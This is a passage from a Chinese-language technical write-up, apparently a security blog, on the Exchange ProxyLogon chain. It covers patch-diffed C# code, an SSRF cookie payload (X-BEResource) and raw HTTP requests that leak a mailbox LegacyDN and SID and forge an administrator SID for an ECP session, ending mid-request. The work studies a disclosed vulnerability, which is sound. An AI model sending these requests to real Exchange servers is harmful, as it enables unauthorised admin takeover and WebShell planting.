</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="kd">override</span> <span class="n">AnchorMailbox</span> <span class="n">ResolveAnchorMailbox</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HttpCookie</span> <span class="n">httpCookie</span> <span class="p">=</span> <span class="k">base</span><span class="p">.</span><span class="n">ClientRequest</span><span class="p">.</span><span class="n">Cookies</span><span class="p">[</span><span class="s">&#34;X-AnonResource-Backend&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">httpCookie</span> <span class="p">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="n">savedBackendServer</span> <span class="p">=</span> <span class="n">httpCookie</span><span class="p">.</span><span class="n">Value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">savedBackendServer</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">base</span><span class="p">.</span><span class="n">Logger</span><span class="p">.</span><span class="n">Set</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="s">&#34;X-AnonResource-Backend-Cookie&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ExTraceGlobals</span><span class="p">.</span><span class="n">VerboseTracer</span><span class="p">.</span><span class="n">IsTraceEnabled</span><span class="p">(</span><span class="m">1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">ExTraceGlobals</span><span class="p">.</span><span class="n">VerboseTracer</span><span class="p">.</span><span class="n">TraceDebug</span><span class="p">&lt;</span><span class="n">HttpCookie</span><span class="p">,</span> <span class="kt">int</span><span class="p">&gt;((</span><span class="kt">long</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="n">GetHashCode</span><span class="p">(),</span> <span class="s">&#34;[OwaResourceProxyRequestHandler::ResolveAnchorMailbox]: AnonResourceBackend cookie used: {0}; context {1}.&#34;</span><span class="p">,</span> <span class="n">httpCookie</span><span class="p">,</span> <span class="k">base</span><span class="p">.</span><span class="n">TraceContext</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="err">#</span> <span class="p">--</span> <span class="err">此处的</span> <span class="n">FromString</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">new</span> <span class="n">ServerInfoAnchorMailbox</span><span class="p">(</span><span class="n">BackEndServer</span><span class="p">.</span><span class="n">FromString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">savedBackendServer</span><span class="p">),</span> <span class="k">this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="n">AnonymousAnchorMailbox</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>BackEndServer.FromString </code>方法获取 Cookie 的 <code>X-BEResource</code> 值中，以 <code>～</code> 波浪线分隔开的 FQDN 和 version，而且涉及一处补丁变更：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028407.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028407.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028407.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028407.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028407.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028407.png-water_print" /></p>
<p>这里的值可以由 Cookie 控制，调用 <code>FromString</code> 的 <code>ResolveAnchorMailbox</code> 方法也有补丁变更。</p>
<p>基本可以说明漏洞点就在这附近了。随后的 <code>GetTargetBackEndServerUrl</code> 方法就把 Fqdn 赋值给了 UriBuilder 对象 Host 属性：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028732.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028732.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028732.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028732.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028732.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172028732.png-water_print" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="k">virtual</span> <span class="n">UriBuilder</span> <span class="n">GetClientUrlForProxy</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="k">new</span> <span class="n">UriBuilder</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">ClientRequest</span><span class="p">.</span><span class="n">Url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>UriBuilder 是一个 .NET 类，在微软的 <a href="https://referencesource.microsoft.com/#system/net/system/uribuilder.cs" target="_blank" rel="noopener noreffer">Reference Source</a> 找到源码。如果传入的 Host 中存在 <code>:</code> 冒号，并且不是 <code>[</code> 开头，就用一对中括号将值包裹起来：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">string</span> <span class="n">Host</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">get</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">m_host</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">set</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">value</span> <span class="p">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">value</span> <span class="p">=</span> <span class="n">String</span><span class="p">.</span><span class="n">Empty</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">m_host</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//probable ipv6 address - </span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">m_host</span><span class="p">.</span><span class="n">IndexOf</span><span class="p">(</span><span class="sc">&#39;:&#39;</span><span class="p">)</span> <span class="p">&gt;=</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//set brackets</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">m_host</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">!=</span> <span class="sc">&#39;[&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">m_host</span> <span class="p">=</span> <span class="s">&#34;[&#34;</span> <span class="p">+</span> <span class="n">m_host</span> <span class="p">+</span> <span class="s">&#34;]&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">m_changed</span> <span class="p">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>根据传入的 version 是否大于 Server.E15MinVersion（1941962752），将 Port 赋值为 444 或 443。最后由 Uri 属性的 get 访问器（accessor）调用 ToString 将各部分拼接还原：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">Uri</span> <span class="n">Uri</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">get</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">m_changed</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">m_uri</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Uri</span><span class="p">(</span><span class="n">ToString</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="n">SetFieldsFromUri</span><span class="p">(</span><span class="n">m_uri</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">m_changed</span> <span class="p">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">m_uri</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到后端 URL 之后继续处理请求头，将 <code>GenerateKerberosAuthHeader</code> 方法生成的 Kerberos 票据放入 Authorization 请求头。<code>CopyHeadersToServerRequest </code> 方法会筛选出后端需要的请求头，其中 <code>ShouldCopyHeaderToServerRequest</code> 方法用来过滤一些自定义请求头：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172030346.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172030346.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172030346.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172030346.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172030346.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172030346.png-water_print" /></p>
<p>最后 <code>AddProtocolSpecificHeadersToServerRequest</code> 方法会将序列化得到的用于标识用户身份的Token，放入 <code>X-CommonAccessToken</code> 请求头中：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172031285.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172031285.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172031285.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172031285.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172031285.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110172031285.png-water_print" /></p>
<p>相应的，后端模块会由 <code>AllowsTokenSerializationBy</code> 方法校验通常机器用户才有的 <code>ms-Exch-EPI-Token-Serialization</code> 扩展权限（验证请求由 CAS 发出），随后反序列化还原 <code>X-CommonAccessToken</code>请求头的身份标识。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="c1">// Microsoft.Exchange.Security.Authentication</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="k">class</span> <span class="nc">BackendRehydrationModule</span> <span class="p">:</span> <span class="n">IHttpModule</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">void</span> <span class="n">Init</span><span class="p">(</span><span class="n">HttpApplication</span> <span class="n">application</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="k">void</span> <span class="n">OnAuthenticateRequest</span><span class="p">(</span><span class="kt">object</span> <span class="n">source</span><span class="p">,</span> <span class="n">EventArgs</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="kd">private</span> <span class="k">void</span> <span class="n">ProcessRequest</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">httpContext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="kd">private</span> <span class="kt">bool</span> <span class="n">TryGetCommonAccessToken</span><span class="p">(</span><span class="n">HttpContext</span> <span class="n">httpContext</span><span class="p">,</span> <span class="n">Stopwatch</span> <span class="n">stopwatch</span><span class="p">,</span> <span class="k">out</span> <span class="n">CommonAccessToken</span> <span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="kd">private</span> <span class="kt">bool</span> <span class="n">IsTokenSerializationAllowed</span><span class="p">(</span><span class="n">WindowsIdentity</span> <span class="n">windowsIdentity</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            			<span class="k">using</span> <span class="p">(</span><span class="n">ClientSecurityContext</span> <span class="n">clientSecurityContext</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ClientSecurityContext</span><span class="p">(</span><span class="n">windowsIdentity</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            			<span class="p">{</span>
</span></span><span class="line"><span class="cl">            				<span class="n">flag2</span> <span class="p">=</span> <span class="n">LocalServer</span><span class="p">.</span><span class="n">AllowsTokenSerializationBy</span><span class="p">(</span><span class="n">clientSecurityContext</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            			<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="n">token</span> <span class="p">=</span> <span class="n">CommonAccessToken</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">httpContext</span><span class="p">.</span><span class="n">Items</span><span class="p">[</span><span class="s">&#34;Item-CommonAccessToken&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="n">token</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以控制 URL 的 <code>Host</code> 部分，payload 如下：</p>
<blockquote>
<p>https://[foo]@example.com:443/path#]:444/owa/auth/x.js</p>
</blockquote>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171745728.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171745728.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171745728.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171745728.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171745728.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110171745728.png-water_print" /></p>
<p>小结一下，Cookie 的 <code>X-BEResource</code> 值可以控制 CAS 请求的 Host，结合 UriBuilder 类特性可以构造出可控的完整 URL。</p>
<h5 id="cve-2021-27065">CVE-2021-27065</h5>
<p>由于上面的 SSRF 漏洞，可以不受限制的访问 Backend。接下来就是寻找 RCE 进行组合攻击。在本节介绍一个 Backend 的 API：<code>proxyLogon.ecp</code> 获取 admin 权限。</p>
<p><code>Microsoft.Exchange.Management.DDIService.WriteFileActivity</code> 未校验写文件后缀，可由文件内容部分可控的相关功能写入 WebShell。</p>
<p><code>Microsoft.Exchange.Management.DDIService.WriteFileActivity</code> 中有一处明显的补丁变动，使得文件后缀名只能为 txt。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180930346.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180930346.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180930346.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180930346.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180930346.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180930346.png-water_print" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">private static readonly string textExtension = &#34;.txt&#34;;
</span></span></code></pre></td></tr></table>
</div>
</div><p>以 <code>ResetOABVirtualDirectory</code> 触发点为例，利用流程如下（均通过 SSRF 发起）：</p>
<ul>
<li>请求 EWS，从 <code>X-CalculatedBETarget</code> 响应头获取后端域名</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180945888.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180945888.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180945888.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180945888.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180945888.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110180945888.png-water_print" /></p>
<ul>
<li>爆破邮箱用户名，请求 <code>Autodiscover</code> 获取配置中的 <code>LegacyDN</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/ecp/test.js</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">IP</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">*/*</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">X-BEResource=]@exchange.pentest.lab/autodiscover/autodiscover.xml?#~1942062522</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/xml</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">343</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;Autodiscover</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Request&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;EMailAddress&gt;</span>win7user@pentest.lab<span class="nt">&lt;/EMailAddress&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;AcceptableResponseSchema&gt;</span>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a<span class="nt">&lt;/AcceptableResponseSchema&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Request&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Autodiscover&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181031982.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181031982.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181031982.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181031982.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181031982.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181031982.png-water_print" /></p>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">此处要注意 XML 的 <code>EMailAddress</code> 标签，应保持在一行，否则会出现找不到邮箱的问题！</div>
        </div>
    </div>
<p>其中：</p>
<ul>
<li>url 中的 <code>/ecp/test.js</code> 不是绝对的，可以是其他的路径 <code>/ecp/xxxxxxxx.png</code></li>
<li>X-BEResource 用于代理请求，其原本格式应该是 <code>[fqdn]~BackEndServerVersion</code>，BackEndServerVersion 应该大于1941962752</li>
<li>exchange.pentest.lab:443 为目标地址</li>
</ul>
<p>如果不需要特别指定端口号，还可以使用下面的值:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">X-BEResource=exchange.pentest.lab/autodiscover/autodiscover.xml?#~1941962753
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样会导致以 443 端口访问<code>https://exchange.pentest.lab/autodiscover/autodiscover.xml?#:444/ecp/target.js</code></p>
<ul>
<li>由 <code>MAPI over HTTP</code> 请求引发 <code>Microsoft.Exchange.RpcClientAccess.Server.LoginPermException</code>，获取 SID</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/ecp/test.js</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">IP</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/mapi-http</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">X-BEResource=]@exchange:444/mapi/emsmdb?MailboxId=win7user@pentest.lab#~1</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Requesttype</span><span class="o">:</span> <span class="l">Connect</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Requestid</span><span class="o">:</span> <span class="l">{C715155F-2BE8-44E0-BD34-2960067874C8}:2</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Clientinfo</span><span class="o">:</span> <span class="l">{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Clientapplication</span><span class="o">:</span> <span class="l">Outlook/15.0.4815.1002</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">145</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/o=PentestLab/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=f3151632f470447b8b05ec011f61cbff-win7user[padding]
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181114200.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181114200.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181114200.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181114200.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181114200.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181114200.png-water_print" /></p>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">此处要在 LegacyDN 后面添加：<code>\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00</code> !</div>
        </div>
    </div>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181115293.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181115293.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181115293.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181115293.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181115293.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202110181115293.png-water_print" /></p>
<ul>
<li>替换尾部 RID 为 500，伪造管理员SID，由 ProxyLogonHandler 获取管理员身份 <code>ASP.NET_SessionId</code> 与 <code>msExchEcpCanary</code>：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/ecp/test.js</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">IP</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/xml</span>
